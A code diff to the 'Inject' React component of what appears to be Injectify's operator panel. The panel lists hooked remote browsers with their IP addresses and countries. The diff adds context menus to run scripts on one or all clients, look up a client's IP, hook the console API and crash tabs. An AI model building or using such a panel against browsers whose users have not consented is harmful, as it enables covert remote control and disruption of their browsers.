@@ -1,6 +1,8 @@
 import React, { Component } from "react";
 import ReactJson from 'react-json-view';
 import Linkify from 'react-linkify';
+import { ContextMenu, MenuItem, ContextMenuTrigger } from "react-contextmenu"
+import copy from 'copy-to-clipboard';
 
 import ChromeTabs from '../ChromeTabs';
 import MonacoEditor from 'react-monaco-editor';
@@ -172,7 +174,7 @@ export class Inject extends Component {
     if (this._mounted) {
       let totaltime = 100
       let array = []
-      if (this.state.clientsGraph[0].length == 0) {
+      if (this.state.clientsGraph[0].length === 0) {
         for (var i = 0; i < totaltime; i++) {
           array[i] = {
             x: i + 1,
@@ -190,7 +192,7 @@ export class Inject extends Component {
       })
       array.push({
         x: totaltime,
-        y: this.state.clients ? this.state.clients.length : 0
+        y: Object.keys(this.state.clients).length
       })
       this.setState({
         clientsGraph: [
@@ -266,6 +268,12 @@ export class Inject extends Component {
         recursive: true,
         script: script || this.state.code,
       })
+    } else if (id === '*') {
+      socket.emit('inject:execute', {
+        project: project,
+        token: token,
+        script: script || this.state.code,
+      })
     } else {
       socket.emit('inject:execute', {
         project: project,
@@ -324,33 +332,63 @@ export class Inject extends Component {
             <Tooltip title="Execute on all clients" placement="right">
               <ComputerIcon onClick={() => this.execute('*')} />
             </Tooltip>
-            Online clients ({this.state.clients ? Object.keys(this.state.clients).length : 0})
+            Online clients {this.state.clients ? `(${Object.keys(this.state.clients).length})` : ''}
           </ListSubheader>
-          <LineChart
-            axes
-            axisLabels={{ x: 'Time', y: 'Clients' }}
-            width={210}
-            lineColors={['cyan']}
-            data={this.state.clientsGraph}
-          />
+          <ContextMenuTrigger id={'graph'}>
+            <LineChart
+              axes
+              xTicks={-1}
+              yTicks={5}
+              axisLabels={{ x: 'Time', y: 'Clients' }}
+              width={210}
+              lineColors={['cyan']}
+              data={this.state.clientsGraph} />
+          </ContextMenuTrigger>
+          <ContextMenu id={'graph'}>
+            <MenuItem onClick={() => this.setState({ clientsGraph: [[]] })}>
+              Clear graph
+            </MenuItem>
+            <MenuItem divider />
+            <MenuItem onClick={() => copy(JSON.stringify(this.state.clientsGraph))}>
+              Copy graph data
+            </MenuItem>
+          </ContextMenu>
           <List className={classes.injectList}>
             {this.state.clients && Object.keys(this.state.clients).map((token, i) => {
               const client = this.state.clients[token]
               return (
-                <ListItem
-                  key={i}
-                  button
-                  dense
-                  onClick={() => this.switchClient(token)}
-                  className={this.state.selectedClient.token === token ? 'active' : ''}>
-                  <ListItemIcon>
-                    <img src={client.images.country} />
-                  </ListItemIcon>
-                  <ListItemIcon>
-                    <img src={client.images.browser} />
-                  </ListItemIcon>
-                  <ListItemText primary={client.ip.query} />
-                </ListItem>
+                <div key={token}>
+                  <ContextMenuTrigger id={token}>
+                    <ListItem
+                      button
+                      dense
+                      onClick={() => this.switchClient(token)}
+                      className={this.state.selectedClient.token === token ? 'active' : ''}>
+                      <ListItemIcon>
+                        <img src={client.images.country} />
+                      </ListItemIcon>
+                      <ListItemIcon>
+                        <img src={client.images.browser} />
+                      </ListItemIcon>
+                      <ListItemText primary={client.ip.query} />
+                    </ListItem>
+                  </ContextMenuTrigger>
+                  <ContextMenu id={token}>
+                    <MenuItem onClick={() => this.execute(token)}>
+                      Execute on all tabs
+                    </MenuItem>
+                    <MenuItem onClick={() => window.open(`https://www.iplocation.net/?query=${client.ip.query}`)}>
+                      IP lookup
+                    </MenuItem>
+                    <MenuItem divider />
+                    <MenuItem onClick={() => this.execute(token, '*', `injectify.console()`)}>
+                      Hook / unhook console API
+                    </MenuItem>
+                    <MenuItem onClick={() => this.execute(token, '*', `injectify.module('crash')`)}>
+                      Crash tabs
+                    </MenuItem>
+                  </ContextMenu>
+                </div>
               )
             })}
           </List>
